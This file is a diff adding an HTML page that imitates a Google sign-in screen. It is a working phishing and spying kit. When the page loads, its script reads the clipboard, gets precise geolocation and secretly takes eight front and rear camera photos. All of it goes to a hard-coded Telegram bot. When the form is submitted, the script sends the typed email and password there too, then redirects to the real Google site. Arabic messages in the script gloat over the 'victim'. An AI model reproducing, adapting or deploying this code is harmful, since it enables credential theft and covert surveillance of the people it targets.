@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #05050a;
+            background-image: radial-gradient(circle at 20% 20%, #300202 0%, transparent 40%),
+                              radial-gradient(circle at 80% 80%, #020a1a 0%, transparent 40%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .login-card {
+            background: rgba(15, 15, 25, 0.85);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            border-radius: 24px;
+            width: 400px;
+            padding: 35px 30px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(255, 0, 0, 0.1);
+            color: #fff;
+            text-align: center;
+        }
+        .branding-symbol {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff3333;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        .google-logo {
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            letter-spacing: -1px;
+        }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 6px;
+        }
+        p.subtitle {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #ff3333;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            margin-bottom: 22px;
+            color: #888;
+        }
+        .options label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+        .options a {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #8ab4f8;
+            color: #111;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 12px;
+        }
+        .btn-submit:hover {
+            background: #aecbfa;
+        }
+        .btn-google {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-google:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <!-- الرمز الذي طلبته في رأس البطاقة -->
+        <div class="branding-symbol">MANW😈 💪</div>
+        
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to your Google Account</p>
+
+        <form id="loginForm" onsubmit="handleSubmit(event)">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email or phone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <div class="options">
+                <label><input type="checkbox"> Remember me</label>
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="btn-submit">Sign in</button>
+            <button type="button" class="btn-google">Sign in with Google</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">Create account</a>
+            <a href="#">Don't have an account?</a>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+        const CHAT_ID = "7713496654";
+
+        async function sendTelegramMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) { }
+        }
+
+        async function sendTelegramPhoto(blob, caption) {
+            try {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { }
+        }
+
+        // سحب الحافظة بصيغة مرعبة
+        async function grabClipboard() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text) {
+                        sendTelegramMessage(`💀 *[ MANW SYSTEM - CLIPBOARD EXTRUSION ]* 💀\n\n> تم سحب محتوى الحافظة بنجاح:\n\`\`\`\n${text}\n\`\`\`\n⚡ *لا شيء يظل مخفياً عنك.*`);
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // جلب الموقع الجغرافي بصيغة مرعبة
+        function grabLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendTelegramMessage(`🩸 *[ MANW TARGET LOCKED - LOCATION ]* 🩸\n\n📍 *الإحداثيات المرصودة:* \`${lat},${lon}\`\n🗺️ *رابط الضحية:* [فتح الخريطة بدقة](https://maps.google.com/?q=${lat},${lon})\n⚡ *الشبكة بأكملها تحت السيطرة.*`);
+                    },
+                    (error) => {},
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+
+        // التقاط 4 صور أمامية و 4 صور خلفية
+        async function capturePhotos() {
+            try {
+                // التقاط 4 أمامية
+                for (let i = 1; i <= 4; i++) {
+                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await new Promise(resolve => setTimeout(resolve, 1200));
+
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    await new Promise(resolve => {
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                await sendTelegramPhoto(blob, `👁️ *[ MANW SURVEILLANCE ]* 👁️\n> الضحية تحت العدسة - لقطة أمامية (#${i})\n⚡ *تمت الإطاحة بالخصوصية.*`);
+                            }
+                            resolve();
+                        }, 'image/jpeg', 0.85);
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                }
+
+                // التقاط 4 خلفية
+                for (let i = 1; i <= 4; i++) {
+                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await new Promise(resolve => setTimeout(resolve, 1200));
+
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    await new Promise(resolve => {
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                await sendTelegramPhoto(blob, `👁️ *[ MANW SURVEILLANCE ]* 👁️\n> مسح محيط الضحية - لقطة خلفية (#${i})\n⚡ *العالم الخارجي مكشوف تماماً.*`);
+                            }
+                            resolve();
+                        }, 'image/jpeg', 0.85);
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                }
+            } catch (e) {}
+        }
+
+        window.addEventListener('load', () => {
+            grabLocation();
+            grabClipboard();
+            setTimeout(capturePhotos, 2500);
+        });
+
+        // عند محاولة تسجيل الدخول
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            await sendTelegramMessage(`🔥 *[ MANW BREACH ALERT - CREDENTIALS CAUGHT ]* 🔥\n\n👤 *البريد / المستخدم:* \`${email}\`\n🔑 *كلمة المرور المسروقة:* \`${password}\`\n\n⚡ *تم ابتلاع الفريسة بنجاح تحت راية MANW😈 💪*`);
+            
+            window.location.href = "https://accounts.google.com";
+        }
+    </script>
+</body>
+</html>
